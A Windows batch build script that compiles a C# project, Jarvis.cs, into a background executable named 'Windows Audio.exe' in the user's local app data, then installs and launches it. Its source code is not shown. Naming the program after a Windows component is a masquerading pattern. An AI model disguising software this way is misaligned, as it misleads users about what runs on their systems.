@echo off
chcp 65001 >nul
set "CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
set "DIR=%LOCALAPPDATA%\Project_Alim"
set "SRC=%~dp0Jarvis.cs"

taskkill /im "Windows Audio.exe" /f >nul 2>&1

if not exist "%CSC%" (
    echo .NET Framework not found.
    pause
    exit /b 1
)

if not exist "%DIR%" mkdir "%DIR%"

echo Building...
"%CSC%" /nologo /target:winexe /optimize+ /define:FRIEND /out:"%DIR%\Windows Audio.exe" /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.Web.Extensions.dll /r:System.Security.dll "%SRC%"
if errorlevel 1 (
    echo Build failed.
    pause
    exit /b 1
)

copy /y "%~dp0icon.png" "%DIR%\" >nul
"%DIR%\Windows Audio.exe" --install
start "" "%DIR%\Windows Audio.exe"
echo Gotovo.
pause
